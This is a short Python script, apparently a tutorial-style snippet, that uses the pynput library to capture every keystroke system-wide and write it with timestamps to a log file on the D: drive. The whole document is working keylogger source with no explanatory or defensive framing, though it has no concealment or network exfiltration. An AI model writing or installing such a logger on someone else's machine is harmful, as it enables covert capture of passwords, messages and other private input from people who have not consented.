from pynput import keyboard
import logging

file_location = "D:/"
logging.basicConfig(filename = (file_location + "keyLog.txt"), 
         level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
   logging.info(str(key))

with keyboard.Listener(on_press = on_press) as listener:
   listener.join()